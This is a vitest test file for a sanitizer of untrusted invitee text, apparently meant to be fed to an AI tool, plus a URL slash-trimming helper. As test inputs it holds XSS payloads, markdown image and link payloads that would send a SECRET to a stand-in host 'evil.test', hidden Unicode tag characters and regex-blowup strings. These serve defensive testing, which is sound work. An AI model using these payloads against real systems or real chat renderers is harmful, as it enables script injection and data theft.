import { describe, expect, it } from 'vitest';
import { trimSlash } from '../oauth/oauth.settings';
import { untrusted } from './support';

describe('untrusted: invitee text never opens a tag', () => {
  it.each([
    ['an unclosed tag', 'hi <script'],
    ['a nested tag', '<<script>script>alert(1)</script>'],
    ['a split tag', '<scr<b>ipt>x'],
    ['a comment or doctype opener', 'x <!-- y <!doctype'],
    ['a closing-tag opener', 'x </div'],
    ['an invisible character between < and the name', `<${String.fromCharCode(0x200b)}script>alert(1)`],
    ['a control character between < and the name', `<${String.fromCharCode(1)}script`],
    ['a markdown link that leaves a lone <', '[<](http://x.test)script>alert(1)'],
  ])('%s leaves no tag opener', (_label, input) => {
    expect(untrusted(input)).not.toMatch(/<[A-Za-z!/?]/);
  });

  it('keeps the readable words', () => {
    expect(untrusted('Hello <b>Ada</b>, see [my site](http://evil.test)')).toBe('Hello Ada, see my site');
  });

  it.each(['<10', '10-50', '>50', '> 50', 'a < b', 'budget > 5k', '<= 3', '1<2'])(
    'round-trips %s exactly (select options and answers must match)',
    (value) => {
      expect(untrusted(value, 100)).toBe(value);
    },
  );

  it('cuts a huge value before the regexes, so it stays fast', () => {
    const started = performance.now();
    for (const ch of ['<', '[', '!', '(']) expect(untrusted(ch.repeat(200_000)).length).toBeLessThanOrEqual(500);
    expect(performance.now() - started).toBeLessThan(500);
  });

  it('stays linear on adversarial nesting (32 fields, as get_booking reads them)', () => {
    const inputs = [`${'<'.repeat(1999)}b`, '<a'.repeat(1000), `${'<<b>'.repeat(500)}x`, '![x]<b>('.repeat(250)];
    const started = performance.now();
    for (let field = 0; field < 32; field += 1) for (const input of inputs) expect(untrusted(input)).not.toMatch(/<[A-Za-z!/?]/);
    expect(performance.now() - started).toBeLessThan(400);
  });

  it.each([
    ['an image glued back by a removed tag', '![x]<b>(http://evil.test/p.png?d=SECRET)'],
    ['a link glued back by a removed tag', '[click]<i>(http://evil.test)'],
    ['an image with nested brackets', '![a[b]](http://evil.test/p.png)'],
    ['a link rebuilt by a link removal', '![x][<](q)b>(http://evil.test)'],
  ])('%s cannot survive as markdown', (_label, input) => {
    expect(untrusted(input)).not.toContain('](');
  });

  it('removes hidden Unicode tag characters', () => {
    expect(untrusted(`a${String.fromCodePoint(0xe0041, 0xe0042)}b`)).toBe('ab');
  });

  it('never cuts an emoji in half at the cap', () => {
    const out = untrusted(`${'a'.repeat(98)}😀tail`, 100);
    expect(out.endsWith('…')).toBe(true);
    expect(/[\uD800-\uDBFF]$/.test(out.slice(0, -1))).toBe(false);
  });
});

describe('trimSlash: linear on caller-controlled input', () => {
  it.each([
    ['https://a.test/mcp/', 'https://a.test/mcp'],
    ['https://a.test/mcp///', 'https://a.test/mcp'],
    ['/', ''],
    ['', ''],
    ['https://a.test', 'https://a.test'],
  ])('%s -> %s', (input, out) => {
    expect(trimSlash(input)).toBe(out);
  });

  it('handles a long run of slashes followed by a character quickly', () => {
    const hostile = `${'/'.repeat(100_000)}x`;
    const started = performance.now();
    expect(trimSlash(hostile)).toBe(hostile);
    expect(trimSlash(`${hostile}${'/'.repeat(100_000)}`)).toBe(hostile);
    expect(performance.now() - started).toBeLessThan(200);
  });
});
